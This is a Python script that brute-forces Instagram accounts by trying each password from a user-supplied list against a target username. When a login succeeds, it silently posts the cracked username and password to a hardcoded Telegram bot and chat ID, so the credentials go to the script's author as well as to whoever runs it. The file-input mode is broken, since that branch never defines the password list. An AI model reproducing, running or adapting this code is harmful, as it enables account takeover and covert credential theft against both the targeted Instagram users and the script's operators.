import requests
import random
from InstagramIG import SidraELEzz
import pyfiglet

R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
B = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White

url = "https://api.telegram.org/bot6259187072%3AAAHH36fVx01jKjntVuXqSAqO5AxdFNQCNWA/sendMessage"
headers = {
    "accept": "application/json",
    "content-type": "application/json"
}
M = pyfiglet.figlet_format(f'---0 0 9 8---')
print(C + M)
print("\n")
print('\033[1;32m └─ Telegram : xp_media \n \n \n \n ')
id = input('\033[1;31m └─[\033[1;32mID\033[1;31m]>\033[1;33m')

password = None

while password not in ['1', '2']:
    password = input('\033[1;31m └─[\033[1;32m Enter password list Mode \033[1;31m]>\033[1;33m \n \n    File : [1] \n     list : [2]  \033[1;31m]>\033[1;33m')

if password == '1':
    email = input('\033[1;31m └─[\033[1;32mEnter Password list txt \033[1;31m]>\033[1;33m')
    file = open(email, 'r')
elif password == '2':
    password_list = input('\033[1;31m └─[\033[1;32mEnter Password list \033[1;31m]>\033[1;33m')
    password_list = password_list.split(',')
    
user = '1234567890'

for password in password_list:
    username = id
    log = SidraELEzz.Instalogin(str(username), str(password))
    
    if log == True:
        requests.post(url, json={
            "text": f'''<b>👻 𝙉𝙀𝙒 𝙋𝘼𝙂𝙀 𝙍𝙀𝘾𝙀𝙄𝙑𝙀𝘿👻</b>
            ➖➖➖➖➖➖➖➖➖
            👤 𝚄𝚂𝙴𝚁 ==> <code>{username}</code>
            🍓 𝙿𝙰𝚂𝚂 ==> <code>{password}</code>
            ➖➖➖➖➖➖➖➖➖
            #تارگت
            <b>🤖 𝗖𝗥 : <a href='t.me/amiirhsen0098'>AMIR 0098 🤖</a></b>''',
            "parse_mode": "Html",
            "disable_web_page_preview": True,
            "disable_notification": False,
            "chat_id": "-1001851750189"
        }, headers=headers)
        
        print(G + '  <=>  password ' + ' ==>' + password)
        
    if log == False:
        print(Y +'   <=>  password ' + ' ==> ' + password)
        
    if log == None:
        print(R +'   <=>  password ' + '==> ' + password)
